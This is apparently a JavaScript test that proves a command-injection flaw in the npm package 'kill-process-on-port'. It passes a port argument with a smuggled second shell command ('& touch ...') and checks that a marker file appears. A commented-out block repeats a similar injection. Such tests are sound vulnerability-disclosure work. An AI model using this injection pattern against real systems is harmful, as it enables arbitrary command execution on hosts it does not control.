test("Command Injection in kill-process-on-port", () => {
  const a = require("kill-process-on-port");
  const fs = require("fs");
  const path = "./kill-process-on-port";
  const sleep = require("sleep");

  // checking that its not present already
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  a.killProcessOnPort("123 & touch kill-process-on-port #");

  sleep.sleep(5);
  // checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); // deleting the file after creation
});

// try
// {
//     a.killProcessOnPort("& touch kill-process-on-port #");
// }
// catch (error) {
//     //console.error(error);
//     // expected output: ReferenceError: nonExistentFunction is not defined
//     // Note - error messages will vary depending on browser
//   }
